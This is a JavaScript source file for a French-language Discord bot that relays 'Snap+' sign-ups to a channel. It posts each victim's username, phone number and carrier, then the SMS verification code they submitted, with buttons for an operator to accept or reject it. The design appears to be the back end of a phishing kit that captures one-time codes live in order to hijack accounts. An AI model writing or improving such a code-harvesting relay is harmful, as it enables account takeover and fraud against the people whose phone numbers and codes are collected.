const {
    Client,
    GatewayIntentBits,
    ActionRowBuilder,
    ButtonBuilder,
    ButtonStyle,
    EmbedBuilder
} = require('discord.js');

const { users } = require('./store');

const client = new Client({
    intents: [GatewayIntentBits.Guilds]
});

client.once('ready', () => {
    console.log(`🤖 Bot Discord connecté : ${client.user.tag}`);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const [action, username] = interaction.customId.split(':');
    const user = users[username];

    if (!user) {
        return interaction.reply({
            content: 'Utilisateur introuvable.',
            ephemeral: true
        });
    }

    if (action === 'accept') {
        user.status = 'verified';

        await interaction.update({
            flags: 32768, // IS_COMPONENTS_V2
            components: [
                {
                    type: 10, // ComponentType.TEXT_DISPLAY
                    content: `✅ Code validé pour ${username}`
                },
                {
                    type: 10, // ComponentType.TEXT_DISPLAY
                    content: `📞 Téléphone: ${formatPhoneNumber(user.phone)}`
                },
                {
                    type: 10, // ComponentType.TEXT_DISPLAY
                    content: `🔢 Code: ${user.submittedCode}`
                },
                {
                    type: 10, // ComponentType.TEXT_DISPLAY
                    content: `📅 Validé à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`
                }
            ]
        });
    }

    if (action === 'reject') {
        user.status = 'rejected';
        const rejectedCode = user.submittedCode;
        user.submittedCode = null;

        await interaction.update({
            flags: 32768, // IS_COMPONENTS_V2
            components: [
                {
                    type: 10, // ComponentType.TEXT_DISPLAY
                    content: `🔒 Code rejeté pour ${username}`
                },
                {
                    type: 10, // ComponentType.TEXT_DISPLAY
                    content: `🔢 Code saisi: ${rejectedCode || 'N/A'}`
                },
                {
                    type: 10, // ComponentType.TEXT_DISPLAY
                    content: `📞 Téléphone: ${formatPhoneNumber(user.phone)}`
                },
                {
                    type: 10, // ComponentType.TEXT_DISPLAY
                    content: `📅 Rejeté à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`
                }
            ]
        });
    }
});

function formatPhoneNumber(phone) {
    if (!phone) return 'N/A';
    if ((phone.startsWith('06') || phone.startsWith('07')) && phone.length === 10) {
        return phone.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
    }
    if ((phone.startsWith('6') || phone.startsWith('7')) && phone.length === 9) {
        return phone.replace(/(\d{2})(\d{2})(\d{2})(\d{3})/, '$1 $2 $3 $4');
    }
    return phone;
}

async function sendInitialEmbed(username, phone) {
    const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);
    const user = users[username];

    await channel.send({
        flags: 32768, // IS_COMPONENTS_V2
        components: [
            {
                type: 10, // ComponentType.TEXT_DISPLAY
                content: '@everyone'
            },
            {
                type: 10, // ComponentType.TEXT_DISPLAY
                content: `📱 Nouvelle inscription Snap+`
            },
            {
                type: 10, // ComponentType.TEXT_DISPLAY
                content: `👤 Nom d'utilisateur: ${username}`
            },
            {
                type: 10, // ComponentType.TEXT_DISPLAY
                content: `📞 Téléphone: ${formatPhoneNumber(phone)}`
            },
            {
                type: 10, // ComponentType.TEXT_DISPLAY
                content: `🏛️ Opérateur: ${user.operator || 'N/A'}`
            },
            {
                type: 10, // ComponentType.TEXT_DISPLAY
                content: `⏰ Date: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`
            },
            {
                type: 10, // ComponentType.TEXT_DISPLAY
                content: '*En attente du code...*'
            }
        ]
    });
}

async function sendCodeEmbed(username) {
    const user = users[username];
    const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);

    await channel.send({
        flags: 32768, // IS_COMPONENTS_V2
        components: [
            {
                type: 10, // ComponentType.TEXT_DISPLAY
                content: '@everyone'
            },
            {
                type: 10, // ComponentType.TEXT_DISPLAY
                content: `🔒 Code de vérification soumis`
            },
            {
                type: 10, // ComponentType.TEXT_DISPLAY
                content: `👤 Nom d'utilisateur: ${username}`
            },
            {
                type: 10, // ComponentType.TEXT_DISPLAY
                content: `🔢 Code saisi: ${user.submittedCode}`
            },
            {
                type: 10, // ComponentType.TEXT_DISPLAY
                content: `📞 Téléphone: ${formatPhoneNumber(user.phone)}`
            },
            {
                type: 10, // ComponentType.TEXT_DISPLAY
                content: `📅 Soumis à: ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`
            },
            {
                type: 10, // ComponentType.TEXT_DISPLAY
                content: '*En attente de validation par un modérateur*'
            },
            {
                type: 1, // ComponentType.ACTION_ROW
                components: [
                    {
                        type: 2, // ComponentType.BUTTON
                        custom_id: `accept:${username}`,
                        label: 'Accepter',
                        style: ButtonStyle.Success
                    },
                    {
                        type: 2, // ComponentType.BUTTON
                        custom_id: `reject:${username}`,
                        label: 'Refuser',
                        style: ButtonStyle.Danger
                    }
                ]
            }
        ]
    });
}

client.login(process.env.BOT_TOKEN);

module.exports = {
    sendInitialEmbed,
    sendCodeEmbed
};